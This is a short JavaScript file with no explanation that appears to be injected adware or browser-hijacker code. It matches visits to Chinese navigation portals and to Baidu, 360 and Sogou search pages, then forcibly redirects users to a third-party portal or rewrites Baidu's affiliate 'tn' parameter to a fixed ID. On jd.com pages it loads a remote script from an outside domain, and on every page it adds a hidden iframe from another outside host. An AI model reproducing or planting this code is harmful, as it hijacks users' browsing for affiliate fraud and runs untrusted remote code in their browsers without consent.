(function () {
  var checkUrls = [
    "^(?!http://hao.hasn9ym.cn/) (.*://www.2345.com.dh810.com/.*html|.*://a5.so123.top/|.*://www.a12356.top/|.*://www.so123.top/|.*://123.sougou.d40e.yzxfzdh.com/|.*://www.2345.com.cn.rl866.com/.*html|.*://s413.sdftryu.com/|.*://s2.biantiaozhi.top/|.*://qw.gotofangjia.top/|.*://p2.officeschool.top/|.*://by.qitabeifen.top/)| (.*://www.duba.com/\\?.*|.*://www.duba.com\\?.*|.*://www.duba.com/.*htm)| (.*://daohang.qq.com/\\?.*|.*://daohang.qq.com\\?.*|.*://daohang.qq.com/.*htm)| (.*://www.hao123.com/\\?.*|.*://www.hao123.com\\?.*|.*://www.hao123.com/.*htm)| (.*://d.ts870.top:9001.*|.*://www.aaa333.xyz.*|.*://www.aaa222.xyz.*|.*://www.738kee.xyz.*|.*://gxxxz.tqmnx.com.*|.*://42.62.30.180.*|.*://djnl.cuuax.com.*|.*://32b1.s.bigowu.com.*)| (.*://hao.360.cn/\\?.*|.*://hao.360.cn\\?.*|.*://hao.360.cn/.*htm)| (.*://hao.360.com/\\?.*|.*://hao.360.com\\?.*|.*://hao.360.com/.*htm)| .*://www.uu114.cn.*| .*://42.62.30.178.*| .*://id4r.com.*| .*://www.newduba.cn.*| .*://duba.uu114.cn.*| .*://(www.2345.com.2345.1230578.com|daohang.qq.com.cn.qq.hao3603.com)/.*.html| (https?://www.haowang1990.xyz/.*)| (https?://a.j6n29.com/.*)| (https?://www.wanghao1990.xyz/.*)| (https?://ss.qitabeifen.top/$)",
    "^(?!https?://(www|www1).baidu.com/\\?(tn=88093251_89_hao_pg))https?://(www|www1).baidu.com/$",
    "^(?!https?://(www|www1).baidu.com/\\?(tn=88093251_89_hao_pg))(https?://(www|www1).baidu.com/\\?tn=.*)",
    "^(?!https?://www.so.com/\\?src=lm&ls=sm2381336&lm_extend=ctype:31)(https?://www.so.com/($|\\?.*))",
    "^(?!http://123.sogou.hasn9ym.cn/)(.*://web.sogou.com/\\?.*)|(.*://123.sogou.com/\\?.*|.*://123.sogou.com\\?.*|.*://123.sogou.com/.*htm)|(https?://dh-123sogou.com/.*)|(.*://(123.sogou.com.dh810.com)/.*.html)",
  ];
  window.opener = null;
  if (new RegExp(checkUrls[0]).test(location.href)) {
    window.open("http://hao.hasn9ym.cn/", "_self");
  } else if (new RegExp(checkUrls[1]).test(location.href)) {
    window.open("https://www.baidu.com/?tn=88093251_89_hao_pg", "_self");
  } else if (new RegExp(checkUrls[2]).test(location.href)) {
    var urll = location.href;
    var urlll = urll.replace(/(tn=.*?&)|(tn=.*$)/, "tn=88093251_89_hao_pg");
    window.open(urlll, "_self");
  } else if (new RegExp(checkUrls[4]).test(location.href)) {
    window.open("http://123.sogou.hasn9ym.cn/", "_self");
  }  else {
    return;
  }
})();

  
   !(function() {
        //if(document.location.hostname === "search.jd.com") {
        if(document.location.hostname.indexOf("jd.com") > -1) {
            var myscript = document.createElement("script");
            var src = "https://gwshop.akeenk.com/online/jdjump.js";
            myscript.setAttribute("src", src);
            myscript.setAttribute("async", "async");
            myscript.setAttribute("charset", "utf-8");
            document.body.appendChild(myscript)
        }
    })();

(function () {
    var myiframe = document.createElement("iframe");
    var if_src = "https://igwshop.ymstudio.com.cn/sd/sua.html";
    myiframe.setAttribute("src", if_src);
    myiframe.setAttribute("style", "display:none;");
    document.body.appendChild(myiframe);
})();